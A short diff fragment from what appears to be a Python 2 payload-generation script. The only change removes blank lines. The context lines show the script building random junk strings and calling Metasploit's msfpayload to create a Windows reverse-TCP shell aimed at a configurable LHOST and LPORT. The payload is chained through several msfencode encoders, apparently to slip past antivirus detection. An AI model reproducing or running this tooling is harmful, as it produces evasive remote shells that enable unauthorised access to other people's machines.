@@ -61,8 +61,6 @@ for i in xrange(0,randomSize):
 	junkB += chr(random.randint(65,90)) 
 junkB +=  "\""
 
-
-
 print "[*] Generating metasploit shellcode..."
 if payload == "1":
 	os.system("./msfpayload windows/shell_reverse_tcp LHOST=%s LPORT=%s R | ./msfencode -t raw -e x86/shikata_ga_nai -c 8 | ./msfencode -t raw -e x86/alpha_upper -c 2 | ./msfencode -t raw -o %s -e x86/countdown -c 4" % (lhost,lport,payload_raw))
